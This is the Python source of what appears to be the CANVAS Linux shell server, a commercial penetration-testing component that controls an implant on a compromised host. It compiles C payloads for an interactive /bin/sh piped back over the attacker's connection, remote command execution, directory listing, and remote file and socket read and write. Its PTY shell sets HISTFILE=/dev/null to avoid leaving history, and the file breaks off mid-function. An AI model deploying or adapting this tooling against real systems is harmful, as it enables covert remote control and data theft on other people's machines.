#! /usr/bin/env python

"""
CANVAS Linux shell server
Uses MOSDEF for dynmanic assembly component linking
"""

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2007
#http://www.immunityinc.com/CANVAS/ for more information

import sys
import os
import socket
from exploitutils import * # hem...

from shellserver import unixshellserver
from shellcode import shellcodeGenerator

from MOSDEF.mosdef_errno import linux_perror
from MOSDEFShellServer import MSSgeneric

#XXX: or whatever you've used as your trojan filename locally
#XXX: This file needs to exist in CWD locally
trojanfile="hs.exe" # XXX: fix this

class LinuxShellServer(MSSgeneric, unixshellserver):

    O_RDONLY=0x0
    O_RDWR=0x2
    O_CREAT=0x40
    O_TRUNC=0x200

    SIG_DFL=0
    SIGCHLD=17
    TIOCGPTN=0x80045430L
        
    def runcommand(self,command):
        """
        Runs a command via popen
        """
        data=self.popen2(command)     
        return data
    
    def runexitprocess(self):
        """Exit the process"""
        self.exit(1)
        return "Exited the process"
     
    def getids(self):
        self.log("Getting UIDs");
        uid, euid, gid, egid = self.ids()
        return "UID=%d EUID=%d GID=%d EGID=%d" % (uid, euid, gid, egid)
    
    def do_pwd(self):
        """
        calls getcwd()
        """
        ####TODO
        ret = self.getcwd()
        return ret
    
    def do_cd(self, dest):
        if sint32(self.chdir(dest)) < 0:
            return "No such directory, drive, or no permissions to access that directory."
        return "Successfully changed to %s" % dest
     
    def do_unlink(self,filename):
        ret=self.unlink(filename)
        if not ret:
            return "%s was unlinked."%filename
        else:
            return "%s was not unlinked due to some kind of error."%filename
   
    def getcwd(self):
        """
        inputs: none
        outputs: returns the current working directory as a string
        """
        vars = {}
        self.clearfunctioncache()
        request = self.compile("""
        #import "local","sendstring" as "sendstring"
        #import "local","getcwd" as "getcwd"
        
        //start of code
        void main() 
        {
            int i;
            char dest[2000];
            //getcwd (char * buffer, int size)
            i = getcwd(dest,1024);
            //i has the length of the string.
            sendstring(dest);
        }
        """,vars)
          
        self.sendrequest(request)
        ret = self.readstring()
        self.leave()
        
        return ret
     
    def shellshock(self, logfile=None):
        """
        implements an interactive shell for people who don't want to use MOSDEF
        """

        vars={}
        vars["mosdefd"]=self.fd

        code="""
#import "int", "mosdefd" as "mosdefd"

#import "local", "pipe" as "pipe"
#import "local", "dup2" as "dup2"
#import "local", "close" as "close"
#import "local", "execve" as "execve"
#import "local", "read" as "read"
#import "local", "fork" as "fork"
#import "local", "write" as "write"
#import "local", "sendstring" as "sendstring"
#import "local", "sendint" as "sendint"
#import "local", "select" as "select"
#import "local", "memset" as "memset"
#import "local", "exit" as "exit"

void main()
{
  char *exec[3];
  char in[512];
  char out[512];
  
  int pid;
  int rfd;
  int wfd;
  int len;
  int n;
  int i;
  int div;
  int tmp;
  int rfdindex;
  int mosindex;
  int mosoffset;
  int rfdoffset;
  int crfds;
  int mosisset;

  int localmask[32];
  int write_pipe[2];
  int read_pipe[2];

  exec[0] = "/bin/sh";
  exec[1] = "-i";
  exec[2] = 0;

  pipe(write_pipe);
  pipe(read_pipe);

  pid = fork();

  if (pid == 0)
  {
    close(0);
    close(1);
    close(2);
    dup2(write_pipe[0], 0);
    dup2(read_pipe[1], 1);
    dup2(read_pipe[1], 2);
    close(read_pipe[0]);
    execve(exec[0], exec, 0);
    exit(1);
  }

  close(read_pipe[1]);
  close(write_pipe[0]);
  rfd = read_pipe[0];
  wfd = write_pipe[1];

  rfdindex = 0;

  if (rfd > 31) 
  {
    rfdindex = rfd;
    while(rfdindex > 31) 
    {
      rfdindex = rfdindex - 32;
    }
  }
  else 
  {
    rfdindex = rfd;
  }
  mosindex = 0;
  if (mosdefd > 31) {
    mosindex = mosdefd;
    while(mosindex > 31) {
      mosindex = mosindex - 32;
    }
  }
  else {
    mosindex = mosdefd;
  }

  i = 0;
  div = rfd;
  while (div > 31)
  {
      i = i+1;
      div = div - 32;
  }
  rfdoffset = i;
  i = 0;
  div = mosdefd;
  while (div > 31)
  {
      i = i+1;
      div = div - 32;
  }
  mosoffset = i;

  while(1)
  {
    memset(&localmask, 0, 128);
    localmask[rfdoffset] = 1<<rfdindex;
    tmp = localmask[mosoffset];
    div = 1<<mosindex;
    localmask[mosoffset] = tmp | div;

    // oi vey, ok both in mask

    if (rfd > mosdefd)
    {
      n = rfd + 1;
    }
    else
    {
      n = mosdefd + 1;
    }

    crfds = 0;
    mosisset = 0;
    if (select(n, &localmask, 0, 0, 0) > 0)
    {

// hahaha, i know...i reeeealllly need to do some proper select macros :P

      tmp = localmask[mosoffset];
      mosisset = tmp>>mosindex;
      mosisset = mosisset & 1;
      tmp = localmask[rfdoffset];
      crfds = tmp>>rfdindex;
      crfds = crfds & 1;

      if (mosisset == 1)
      {
        memset(&out, 0, 512);
        len = read(mosdefd, out, 511);
        if (len > 0)
        {
          write(wfd, out, len);
        }
      }
      if (crfds == 1)
      {
        memset(&in, 0, 512);
        len = read(rfd, in, 511);
        if (len > 0)
        {
          sendstring(in);
        }
        else
        {
          sendint(0);
          return;
        }
      }
    }
    else
    { 
      sendint(0);
      return;
    }
  }
}
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)

        ret = self.shellshock_loop(endian = self.Endianness, logfile=logfile)

        self.leave()               
        return
     
    def popen2(self,command):
        """
        runs a command and returns the result
        Note how it uses TCP's natural buffering, and 
        doesn't require a ping-pong like protocol.
        """

        vars={}
        vars["command"]=command
        code="""
        #import "string","command" as "command"
        
        #import "local","pipe" as "pipe"
        #import "local", "dup2" as "dup2"
        #import "local", "close" as "close"
        #import "local", "execve" as "execve"
        #import "local", "read" as "read"
        #import "local", "fork" as "fork"
        #import "local", "exit" as "exit"
        #import "local", "memset" as "memset"
        #import "local", "waitpid" as "waitpid"
        
        //#import "local", "debug" as "debug"
        #import "local", "sendstring" as "sendstring"
        

        void main()
        {
          int pipes[2];
          int bpipes[2];
          char buf[1001];
          char *argv[4];
          char **envp;
          int ret;
          int pid;
          
          //pipes[0] is now for reading and pipes[1] for writing

          envp=0;
          argv[0]="/bin/sh";
          argv[1]="-c";
          argv[2]=command;
          argv[3]=0;
          
           //now we fork and exec and read from the socket until we are done
           ret=pipe(pipes);
           ret=pipe(bpipes);
           pid=fork();
           if (pid==0) 
           {
              //child
              close(0);
              close(1);
              close(2);
              ret=dup2(pipes[0],0);
              ret=dup2(bpipes[1],1);
              ret=dup2(bpipes[1],2);
              close(bpipes[0]);
              execve(argv[0],argv,envp);
              exit(1); //in case it failed
           }
           ret=close(bpipes[1]);
           ret=close(pipes[0]);
           memset(buf,0,1001);
           //debug();           
           while (read(bpipes[0],buf,1000)!=0) {
              sendstring(buf);
              memset(buf,0,1001);
           }
           //debug();
           //send blank string...
           sendstring(buf);
           close(pipes[1]);
           close(bpipes[0]);
           //we do this twice in the event that 
           //our previous process did not exit by now...
           //we could listen for pid, but instead, we listen for any process
           //that is a zombie
           waitpid(-1,0,1); //wnohang is 1
           waitpid(-1,0,1); //wnohang is 1
        }
        """
        self.clearfunctioncache()         
        request=self.compile(code,vars)
        self.sendrequest(request)
        tmp=self.readstring()
        data=tmp
        while tmp != "":
            tmp=self.readstring()
            data+=tmp
        self.leave()
               
        return data
    
    def dodir(self, directory):
        if directory[-1] != "/":
            directory += "/"
            
        vars = {"directory":directory}
        code = """
        #include <sys/stat.h>
        #import "string","directory" as "directory"
        #import "local","sendint" as "sendint"
        #import "local","sendshort" as "sendshort"
        #import "local","sendstring" as "sendstring"
        #import "local", "getdents" as "getdents"
        #import "local", "open" as "open"
        #import "local", "write" as "write"
        #import "local", "strcpy" as "strcpy"
        #import "local", "strcat" as "strcat"
        #import "local", "stat" as "stat"

        struct dirent {
            int   d_ino;
            int   d_off;
            short d_reclen;
            char  d_name[256];
        };

        void main( )
       {
          char dirp[500];
          struct dirent *dirptr;
          int fd;
          char *buf;
          char *end;
          int ret;
          int ret2;
          
          struct stat tats;
          int count;
          int lt;
          char filename[8096]; // This should be MAXPATH
          int fp;

          ret = 1;
          // O_DIRECTORY | O_RDONLY
          fd = open(directory, 0x10800);

          while ( ret > 0 ) {
               ret = getdents( fd, &dirp, 500);
               if (ret > 0) {
                   buf = dirp;
                   end = dirp + ret;
                   dirptr = &dirp;
                   lt = dirptr->d_reclen;
                   while( buf < end ) {
                        sendint(1);
                        strcpy(filename, directory);
                        strcat(filename, dirptr->d_name);
                        stat( filename , &tats);
                        sendstring(dirptr->d_name);
                        sendshort(tats.st_mode);
                        sendshort(tats.st_uid);
                        sendshort(tats.st_gid);
                        sendint(tats.st_size);
                        sendint(tats.st_mtime);

                        buf = buf + lt;
                        dirptr = buf;
                        lt = dirptr->d_reclen;
                   }
               }
               else {
                   sendint(ret);
               }

           }
       } 
        """
        self.clearfunctioncache()         
        request=self.compile(code,vars)
        self.sendrequest(request)
        tmp = self.readint()
        files = []
        while tmp > 0:        
            d_name = self.readstring()
            statbuf=self.readstruct([("s","st_mode"),
                                     ("s","st_uid"),
                                     ("s","st_gid"),
                                     ("l","st_size"),
                                     ("l","st_mtime")])
            files.append( (d_name, statbuf) )
            tmp = self.readint()
            
        self.leave()

        return files
            
    def prctl(self, option, arg2 = 0, arg3 = 0, arg4 = 0, arg5 = 0):
        vars = {'option': option, 'arg2': arg2, 'arg3': arg3, 'arg4': arg4, 'arg5': arg5}
        code = """
        #import "local","sendint" as "sendint"
        #import "local","prctl" as "prctl"
        #import "int", "option" as "option"
        #import "int", "arg2" as "arg2"
        #import "int", "arg3" as "arg3"
        #import "int", "arg4" as "arg4"
        #import "int", "arg5" as "arg5"
        void main()
        {
             int ret;
             
             ret = prctl(option, arg2, arg3, arg4, arg5);

             sendint(ret);
        }
        """
        self.clearfunctioncache()
        request = self.compile(code, vars)
        self.sendrequest(request)
        ret = self.readint(signed=True)
        self.leave()
        return ret
    
    def uname(self):
        code = """        
        #import "local", "uname" as "uname"
        #import "local", "sendblock2self" as "sendblock2self"
        #import "local", "sendint" as "sendint"
        void main()
        {
            char buf[390]; 
            int ret;
            
            ret = uname(buf);
            sendint(ret);
            if (ret == 0)
            {
                sendblock2self(buf, 390);
            }
            
        }
        """
        self.clearfunctioncache()         
        request=self.compile(code)
        self.sendrequest(request)
        rv = self.readint(signed=True)
        if rv == 0:
            elements = ["sysname", "nodename", "release", "version", "machine", "domain"]
            uname = {}            
            data = self.readblock()
            print "ZOMG: %s" % data
            i = 0
            for c in data.split("\x00"):
                if len(c) > 0:
                    uname[elements[i]] = c
                    i+= 1
            
            rv = uname
        else:
            rv = None

        self.leave()        
        return rv

    def getpagesize(self):
        _SC_PAGESIZE = self.libc.getdefine('_SC_PAGESIZE')
        # TODO: implement sysconf()
        #
        # getpagesize = sysconf(_SC_PAGESIZE);
        #
        # for Linux/x86 pagesize=4k
        if self.arch.upper() == 'X86':
            return 4096
        return _SC_PAGESIZE
    
    def xx_getids(self):
        uid,euid,gid,egid=self.ids()
        return "UID=%d EUID=%d GID=%d EGID=%d"%(uid,euid,gid,egid)
        
    def fexec(self,command,args,env):
        """
        calls fork execve
        """

        code=""
        vars={}
        vars["command"]=command
        i=0
        for a in args:
            vars["arg%d"%i]=a
            code+="#import \"string\",\"arg%d\" as \"arg%d\""%(i,i)
            i+=1
        i=0
        for e in env:
            vars["env%d"%i]=e
            code+="#import \"string\",\"env%d\" as \"env%d\""%(i,i)
            i+=1
        maxargs=len(args)
        maxenv=len(env)
          
        code+="""
          //start
#import "local", "close" as "close"
#import "local", "execve" as "execve"
#import "local", "read" as "read"
#import "local", "fork" as "fork"
#import "string", "command" as "command"

#import "local", "debug" as "debug"
#import "local", "exit" as "exit"
#import "local", "memset" as "memset"
#import "local", "waitpid" as "waitpid"


void main()
{
          int pipes[2];
          int bpipes[2];
          char buf[1001];
          char *argv[ARGVNUM];
          char *envp[ENVNUM];
          int ret;
          int pid;
          
          //pipes[0] is now for reading and pipes[1] for writing

          """
        code=code.replace("ARGVNUM",str(maxargs+1))
        code=code.replace("ENVNUM",str(maxenv+1))
        code+="envp[%d]=0;\n"%maxenv
        code+="argv[%d]=0;\n"%maxargs
        for i in range(0,maxargs):
            code+="argv[%d]=arg%d;\n"%(i,i)
        for i in range(0,maxenv):
            code+="envp[%d]=env%d;\n"%(i,i)
        code+="""
           //now we fork and exec and read from the socket until we are done
           pid=fork();
           if (pid==0) 
           {
              //child
              close(1);
              close(2);
              execve(command,argv,envp);
              exit(1); //in case it failed
           }
           
           //we do this twice in the event that 
           //our previous process did not exit by now...
           //we could listen for pid, but instead, we listen for any process
           //that is a zombie
           waitpid(-1,0,1); //wnohang is 1
           waitpid(-1,0,1); //wnohang is 1
           }
       
        """
        self.clearfunctioncache()          
        request=self.compile(code,vars)
        self.sendrequest(request)
        self.leave()
               
        return

    ############
    #PTY FUNCTIONS
    ############
    
    def ioctlgetint(self,fd,ioctlval,myint=0):
        vars={}
        vars["fd"] = fd
        vars["myint"] = myint
        vars["ioctlval"] = ioctlval
        code="""
        #import "local","sendint" as "sendint"
        #import "local","ioctl" as "ioctl"
        #import "int", "fd" as "fd"
        #import "int", "ioctlval" as "ioctlval"
        #import "int", "myint" as "myint"
        void main()
        {
             int ret;
             int i;
             
             i = myint;
             ret = ioctl(fd,ioctlval,&i);
             sendint(ret);
             sendint(i);
        }
        """
        self.clearfunctioncache()
        request = self.compile(code,vars)
        self.sendrequest(request)
        ret = self.readint(signed=True)
        i = self.readint()
        self.leave()
        return ret,i
    
    def ioctlint(self,fd,ioctlval,myint):
        ret,retval=self.ioctlgetint(fd,ioctlval,myint)
        return ret
    
    def findpts(self):
        master=self.open("/dev/ptmx",self.O_RDWR)
        if master==0:
            return 0,None
        ret=self.grantpt(master)
        ret=self.unlockpt(master)
        slave=self.ptsname(master)
        return master,slave
        
    def ptsname(self,fd):
        devlog("linux","ptsname %d"%fd)
        ret,retval=self.ioctlgetint(fd,self.TIOCGPTN)
        devlog("linux","ptsname %d ret=%d retval=%d"%(fd,ret,retval))

        if ret:
            return None
        else:
            return "/dev/pts/%d"%retval
        
    def grantpt(self,fd):
        devlog("linux","grantpt called %d"%fd)
        ret,retval=self.ioctlgetint(fd,self.TIOCGPTN)
        devlog("linux","grantpt returned %x:%x"%(ret,retval))
        return 0

    def unlockpt(self,fd):
        devlog("linux","unlockpt called %d"%fd)        
        TIOCSPTLCK=0x40045431
        ret=self.ioctlint(fd,TIOCSPTLCK,0)
        if not ret:
            return -1
        
        return ret
    
    def sh_tty_child(self,master,slavedev):
        vars={}
        vars["master"]=master
        vars["slavedev"]=slavedev
        code="""
        #import "local","sendint" as "sendint"
        #import "local","sendshort" as "sendshort"
        #import "local","ioctl" as "ioctl"
        #import "int", "master" as "master"
        #import "string", "slavedev" as "slavedev"
        
        #import "local","setsid" as "setsid"
        #import "local","execve" as "execve"
        #import "local","fork" as "fork"
        #import "local","dup2" as "dup2"
        #import "local","close" as "close"
        #import "local","open" as "open"
        
        void main()
        {
             int ret;
             int i;
             int access;
             char *argv[2];
             char *envv[3];
             int pid;
             int slave;
             char * p;
             
             pid=fork();
             if (pid==0) {
                access=2; // O_RDWR
                ret=setsid();
                if (ret<0) {
                   return 0;
                }
                
                slave=open(slavedev,access,0);
                if (slave < 0) {
                   return 0;
                }
                //0x5302 == I_PUSH
                // dup2(slave,slave);
                //this is solaris code we've commented out
                //p="ptem";
                //ioctl(slave, 0x5302, p);
                //p="ldterm";
                //ioctl(slave, 0x5302, p);
                close(master);
                dup2(slave,0);
                dup2(slave,1);
                dup2(slave,2);
                if (slave>2) {
                   close(slave);
                }
                //some tcsetattr stuff here
                argv[0]="sh";
                argv[1]=0;
                envv[0]="TERM=xterm";
                envv[1]="HISTFILE=/dev/null";
                envv[2]=0;
                execve("/bin/sh",argv,envv);
            }                
            return 0;
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        self.leave()
        return 
    
    ###################################################################    

    def readfromfd(self,fd,filesize):
        """ Reads from a open fd on the remote host, filesize of 0 reads untill EOF """

        # XXX: this code is lacking error checking and redundancy logic !

        vars = {}
        vars["bufsize"] = filesize
        vars["socketfd"] = self.fd
        vars["filefd"] = fd

        code="""
        #import "local", "read" as "read"
        #import "local", "writeblock" as "writeblock"
        #import "int", "bufsize" as "bufsize"
        #import "int", "socketfd" as "socketfd"
        #import "int", "filefd" as "filefd"

        void main () {
          char buf[1024];
          char *p;
          char *i;
          int left;
          int ret;

          if (bufsize == -1) // -1 reads untill EOF
          {
              ret = 1;
              // read untill EOF (ret == 0)
              while(ret != 0)
              {
                  // A MOSDEF BLIND EOF PROTOCOL

                  // 1024 blocks, rets are appended in front
                  // ret of 0 == EOF, otherwise treat as len
                  // this protocol is handled in reliableread
                  // and is needed for 0 sized files such as
                  // /proc/mounts .. this will also allow our
                  // download to work on such files ;)

                  p = buf;
                  p = p + 4;
                  ret = read(filefd, p, 1020);
                  i = &ret;
                  p = p - 4;
                  // XXX: deal with node endianness at the struct unpack
                  p[0] = i[0];
                  p[1] = i[1];
                  p[2] = i[2];
                  p[3] = i[3];
                  // make ret the first 4 bytes
                  writeblock(socketfd, buf, 1024);
              }
              return;
          }
          else
          {
              // original readfromfd code .. serio needs a rewrite for redundancy

              left = bufsize;
              while (left > 1024) 
              {
                  read(filefd, buf, 1024);
                  writeblock(socketfd, buf, 1024);
                  left = left - 1024;
              }
              if (left > 0) 
              {
                  read(filefd, buf, left); 
                  writeblock(socketfd, buf, left);
              }
          }
          
        }
        """
        self.clearfunctioncache()
        request = self.compile(code,vars)
        self.sendrequest(request)
        data = self.readbuf(filesize)

        self.leave()
        return data

    def writetofd(self,fd,data):
        """
        Writes all the data in data to fd
        """

        vars={}
        vars["bufsize"]=len(data)
        vars["socketfd"]=self.fd
        vars["filefd"]=fd
          
        # XXX we don't check if write() succeeded here...
        code="""
        #import "local", "readblock" as "readblock"
        #import "local", "write" as "write"
        //#import "local", "debug" as "debug"
        #import "int", "bufsize" as "bufsize"
        #import "int", "socketfd" as "socketfd"
        #import "int", "filefd" as "filefd"

        void main () 
        {
            char buf[1001];
            int left;
            int ret;

            left = bufsize;

            while (left > 1000) 
            {
                readblock(socketfd,buf,1000); 
                ret = write(filefd,buf,1000);
                // for linux on error we return 0-errno :>
                if (ret < 0)
                {
                    left = 0;
                }
                else
                {
                    left = left-1000;
                }
            }
           
            if (left > 0) 
            {
                readblock(socketfd,buf,left); 
                ret = write(filefd,buf,left);
                // XXX: error check missing
            }
        }
        """
        self.clearfunctioncache()
        request = self.compile(code,vars)
        self.sendrequest(request)
        self.writebuf(data)
        self.leave()

        return
     
    def setblocking(self,fd,blocking):
        code="""
        #import "local", "fcntl" as "fcntl"
        #import "int", "O_NONBLOCK" as "O_NONBLOCK"
        #import "int", "O_BLOCK" as "O_BLOCK"
        #import "int", "sock" as "sock"
        #import "int", "F_SETFL" as "F_SETFL"
        #import "int", "F_GETFL" as "F_GETFL"

        void main() {
          int opts;
          
          opts=fcntl(sock,F_GETFL,0); //MOSDEF uses a null arg
          """
        if blocking:
            #set blocking by clearing the nonblocking flag
            code+="opts=opts & O_BLOCK;\n"
        else:
            #set nonblocking
            code+="opts=opts | O_NONBLOCK;\n"
        code+="""
          fcntl(sock,F_SETFL,opts);
        }
        """
        vars = self.libc.getdefines()
        vars["sock"]=fd
        self.clearfunctioncache()
        message=self.compile(code,vars)
        self.sendrequest(message)
        self.leave()

        return
     
    def setsockopt(self,sockfd,option,arg):
        code="""
        #import "local", "setsockopt" as "setsockopt"
        #import "int","arg" as "arg"
        #import "int","option" as "option"
        #import "int","level" as "level"
        #import "int", "sockfd" as "sockfd"

        void main() {
           // XXX: 5 args .. deal with optlen .. &arg is *optval
           int i;
           i = arg;
           setsockopt(sockfd,level,option,&i,4);
        }
        """
        vars = self.libc.getdefines()
        vars["option"]=option
        vars["arg"]=arg
        vars["sockfd"]=sockfd
        vars["level"] = vars['SOL_SOCKET']
        self.clearfunctioncache()
        message=self.compile(code,vars)
        self.sendrequest(message)
        self.leave()

        return
     
    def getrecvcode(self,fd,length):
        devlog('shellserver::getrecvcode', "Creating recv code for fd %d of length %d" % (fd, length))
        code="""
        #import "local", "recv" as "recv"
        #import "local", "writeblock2self" as "writeblock2self"
        #import "int", "length" as "length"
        #import "int", "fd" as "fd"
        
        void main() 
        {
            int i;
            char buf[1000];
            int wanted;

            //flags set to zero here
            wanted = length;
            while (wanted > 0 ) 
            {
                if (wanted < 1000) 
                {
                    i = recv(fd, buf, wanted, 0);
                }
                else
                {
                   i = recv(fd, buf, 1000, 0);
                }
                // error handling .. 0-errno is returned from syscall
                if (i < 0)
                {
                    writeblock2self(buf,0); 
                    wanted = 0;
                }
                else 
                {
                    writeblock2self(buf,i);
                    wanted = wanted - i;
                }
              
            }
        }
        """
        vars = {}
        vars["fd"] = fd
        vars["length"] = int(length)
        self.clearfunctioncache()
        message = self.compile(code,vars)
        return message
     
    def recv_lazy(self,fd,timeout=None,length=1000):
        """
        Get whatever is there
        We return a "" when there is nothing on the socket
        
        """
        #print "In recv_lazy fd=%d"%fd
        if timeout==None:
            timeout=0 #immediately return
        if length>1000:
            length=1000
               
        code="""
        #include <sys/poll.h>
        #import "local", "recv" as "recv"
        #import "local", "sendblock2self" as "sendblock2self"
        #import "local", "sendint" as "sendint"
        #import "int", "fd" as "fd"
        #import "int", "timeout" as "timeout"
        #import "int", "length" as "length"
        
        void main() 
        {
            int i;
            char buf[1000];
            int r;
            struct pollfd ufds;
            
            ufds.fd = fd;
            ufds.events = 1;
        
            //timeout is in ms
            i = poll(&ufds,1,timeout);
            r = ufds.revents & 9; //AND with POLLIN and POLLERR
        
            // send poll result not revents!
            sendint(i);

            if (r > 0) 
            {
                //flags set to zero here
                i = recv(fd, buf, length, 0);
                sendint(i);

                if (i > 0) 
                {
                    sendblock2self(buf, i);              
                }
            } 
        }
        """    
        vars = {}
        vars["fd"] = fd
        vars["timeout"] = timeout
        vars["length"] = length
        self.clearfunctioncache()
        message = self.compile(code,vars)
        self.sendrequest(message)
        poll_result = sint32(self.readint())
        recv_result = 1 #fake result 
        
        if poll_result > 0:
            recv_result = sint32(self.readint())
            if recv_result > 0:
                buffer = self.readblock()

        self.leave()
        
        #raise exceptions on exceptional conditions like timeout or socket errors
        if poll_result <= 0:
            #because we are lazy recv, we don't raise an exception here, but we do return "" as our data
            #this would only be valid normally if size was 0 which is used to test a socket
            #print "Timeout"
            #raise timeoutsocket.Timeout
            buffer = ""
           
        if recv_result <= 0:
            raise socket.error

        #buffer should exist!
        return buffer
     
    def accept(self,fd):
        devlog('linuxMosdefShellServer::accept()', "fd=%d" % fd)
        code="""
        #import "local", "accept" as "accept"
        #import "int", "fd" as "fd"
        #import "local", "sendint" as "sendint"
        #import "local", "memset" as "memset"
        #include "socket.h"

        void main()
        {
            int i;
            struct sockaddr_storage ss;
            struct sockaddr_in *sa;

            sa = &ss;
            int len;
            len = 128;
            memset(&ss, 0, 128);
            i = accept(fd, sa, &len);
            sendint(i);
            sendint(sa->addr);
        }
        """
        vars={}
        vars["fd"] = fd
        self.clearfunctioncache()
        #devlog('linuxMosdefShellServer::accept()', "self.compile is %s" % self.compile)
        message = self.compile(code,vars)
        self.sendrequest(message)
        # C: signed int accept(), so we return sint32
        ret = self.readint(signed=True)
        devlog('linuxMosdefShellServer::accept()', "ret=%d" % ret)
        addr = self.readint()
        devlog('linuxMosdefShellServer::accept()', "addr=%d" % addr)
        self.leave()

        return ret

    def getsendcode(self,fd,buffer):
        """Reliable send to socket, returns a shellcode for use by Node and self"""

        devlog('shellserver::getsendcode', "(LINUX) Sending %d bytes to fd %d" % (len(buffer), fd))

        code="""
        #import "int", "length" as "length"
        #import "int", "fd" as "fd"
        #import "string", "buffer" as "buffer"
        #import "local", "send" as "send"

        #import "local", "sendint" as "sendint"

        void main() 
        {
           int i;
           char *p;
           int wanted;
           int success;

           success = 1; // optimist
           wanted = length;
           p = buffer;

           while (wanted > 0) 
           {
               i = send(fd, p, wanted, 0); // flags set to zero here
              
               // 0-errno is returned from syscall on our Linux imp.
               if (i < 0) 
               {
                   wanted = 0;
                   success = 0;
               }
               else
               { 
                   wanted = wanted-i;
                   p = p + i;
               }
           }

           sendint(success);
        }
        """

        # XXX: check this with hasattr in MOSDEFNode
        # XXX: until everything is moved over
        self.special_shellserver_send = True

        vars = {}
        vars["fd"] = fd
        vars["length"] = len(buffer)
        vars["buffer"] = buffer
        self.clearfunctioncache()
        message = self.compile(code,vars)
        return message

    def write(self,fd,buffer):
        """
        Write to a buffer
        return 1 for success, 0 on error
        """
        code="""
        #import "int", "length" as "length"
        #import "int", "fd" as "fd"
        #import "string", "buffer" as "buffer"
        #import "local", "write" as "write"
        #import "local", "sendint" as "sendint"

        void main() 
        {
            int i;
            char *p;
            int wanted;
            int success;

            wanted = length;
            p = buffer;
            success = 1; // optimist

            while (wanted > 0 ) 
            {
                i = write(fd, p, wanted); 
                if (i < 0) 
                {
                    wanted = 0;
                    success = 0;
                }
                else
                {
                    wanted = wanted-i;
                    p = p+i;
                }
            }
          
            sendint(success);
        }
        """
        vars = {}
        vars["fd"] = fd
        vars["length"] = len(buffer)
        vars["buffer"] = buffer
        self.clearfunctioncache()
        message = self.compile(code,vars)
        self.sendrequest(message)
        ret = self.readint(signed=True)
        self.leave()
        return ret
    
    def read(self,fd,length):
        """
        read to a buffer from an fd
        return 1 for success, 0 on error
        """
        code="""
        #import "int", "length" as "length"
        #import "int", "fd" as "fd"
        #import "local", "read" as "read"
        #import "local", "sendblock2self" as "sendblock2self"
        #import "local", "sendint" as "sendint"
        
        void main() 
        {
            int i;
            char *p;
            char buffer[2000];

            p = buffer;

            i = read(fd, p, length); 
            sendint(i);

            if (i > 0) 
            {
                sendblock2self(buffer, i);
            }
        }
        """
        vars = {}
        vars["fd"] = fd
        if length > 2000: 
            length = 2000
        vars["length"] = length
        self.clearfunctioncache()
        message = self.compile(code,vars)
        self.sendrequest(message)
        ret = self.readint(signed=True)
        buffer=""
        if ret > 0:
            buffer = self.readblock()
        self.leave()
        return ret,buffer
        
    def isactive(self,fd,timeout=0):
        """
        Checks to see if fd is readable
        """
      
        if timeout==None:
            timeout=0
        code="""
        #import "local","select" as "select"
        #import "local","FD_ZERO" as "FD_ZERO"
        #import "local","FD_SET" as "FD_SET"
        #import "int" , "readfd" as "readfd"
        #import "int" , "timeout" as "timeout"
        #import "local", "sendint" as "sendint"
        #import "local", "debug" as "debug"
        
        struct timeval {
          int tv_sec;
          int tv_usec; 
        };
   
        void main() {
            int nfds;
            int read_fdset[32];
            struct timeval tv;
            int i;
            
            tv.tv_sec = timeout;
            tv.tv_usec = 0;
            
            nfds = readfd+1;
            FD_ZERO(read_fdset);
            FD_SET(readfd,read_fdset);
            i = select(nfds, read_fdset, 0, 0, &tv);
            if (i > 0) 
            {
              sendint(1);
            }
            else 
            {
              sendint(0);
            }
        }
        """
        vars={}
        vars["timeout"] = timeout
        vars["readfd"] = fd
        self.clearfunctioncache()
        message = self.compile(code,vars)
        self.sendrequest(message)
        ret = self.readint(signed=True)
        self.leave()
        return ret
 
    def readall(self,fd):
        """
        Read any and all data on the fd. Returns "" if none.
        """
        done=0
        retlist=[]
        while not done:
            ret=0
            if self.isactive(fd,timeout=5):
                ret,data=self.read(fd,1000)
                retlist+=[data]
            if not ret:
                done=1

        ret="".join(retlist)
        return ret
        
    def read_until(self,fd,prompt):
        """reads until we encounter a prompt"""
        print "read_until %d:%s called"%(fd,prompt)
        
      
        buf=""
        tmp="A"
        
        while tmp!="":
            tmp=self.read_some(fd)
            buf+=tmp
            if buf.find(prompt)!=-1:
                return buf
        #we did not find our string, and the socket closed or failed to respond!
        return ""
    
    def read_some(self,fd):
        """Read at least one byte of data"""
        buf=""
        tmp="A"
        #print "In read_some"
        if self.isactive(fd):
            ret,tmp=self.read(fd,1)
            if ret:
                buf+=tmp
        return buf
    
    # XXX: when bouncing ... MOSDEFNode calls the getsendcode
    # XXX: so for Linux shellservers you have to handle the
    # XXX: sendcode return value like you do from here :>

    def send(self, fd, buffer):
        """
        reliable send to socket
        """

        #print "XXX: fix me? def send LINUX called"
        message = self.getsendcode(fd, buffer)

        self.sendrequest(message)

        # XXX: we probably wanna do this for all the shellservers :>

        # sendcode now returns a value indicating failure (0), success (1)
        ret = self.readint()

        # done with the node end of things .. release thread
        self.leave()

        if not ret:
            raise Exception, '[!] send failed ... handle me! (re-raise to socket.error in MOSDEFSock)'

        return len(buffer) # as per send(2) specs

    def socket(self,proto):
        """
        calls socket and returns a file descriptor or -1 on failure.
        """
        code="""
        #import "int", "family" as "family"
        #import "int", "proto" as "proto"
        #import "int", "raw_proto" as "raw_proto"
        #include "socket.h"
        #import "local", "socket" as "socket"
        #import "local", "sendint" as "sendint"
 
        void main()
        {
           int i;
           i=socket(family,proto,raw_proto);
           sendint(i);
        }
        """
        family=self.libc.getdefine("AF_INET")
        raw_proto=0
        if proto.lower()=="tcp":
            proto=self.libc.getdefine('SOCK_STREAM')
        elif proto.lower()=="udp":
            proto=self.libc.getdefine('SOCK_DGRAM')
        elif proto.lower()=="raw":
            proto=self.libc.getdefine('SOCK_RAW')
            family=self.libc.getdefine('AF_PACKET')
            raw_proto=0x800 #self.libc.getdefine('ETH_P_IP')
        else:
            print "Don't know anything about protocol %s in socket()"%proto
            return -1

        vars = {}
        vars ["family"] = family 
        vars ["proto"]=proto
        vars ["raw_proto"]=raw_proto

        self.clearfunctioncache()
        message=self.compile(code,vars)
        self.sendrequest(message)
        ret=self.readint(signed=True)
        self.leave()

        return ret
    
    def connect(self,fd,host,port,proto,timeout):
        if proto.lower()=="tcp":
            proto=self.libc.getdefine('SOCK_STREAM')
        elif proto.lower()=="udp":
            proto=self.libc.getdefine('SOCK_DGRAM')
        else:
